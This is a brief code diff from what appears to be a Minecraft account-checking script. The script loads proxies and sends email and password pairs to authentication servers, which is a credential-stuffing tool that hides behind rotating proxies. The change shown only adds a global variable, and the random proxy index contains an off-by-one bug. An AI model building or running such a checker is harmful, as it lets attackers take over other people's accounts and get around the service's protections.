@@ -30,6 +30,7 @@ with open("proxies.txt") as f: # Open the file
     IP, Port = zip(*reader) # Split the lines into two lists, IPs and Ports
 
 def checkAccount(accountNumber):
+    global working
     try:
         proxyNumber = random.randint(0,len(IP)) # Get a random proxy from the proxy list
         data = '{"agent":{"name":"Minecraft","version":1},"username":"' + email[accountNumber] +'","password":"' + password[accountNumber] + '"}' # Set the data that will be sent to the auth servers to check
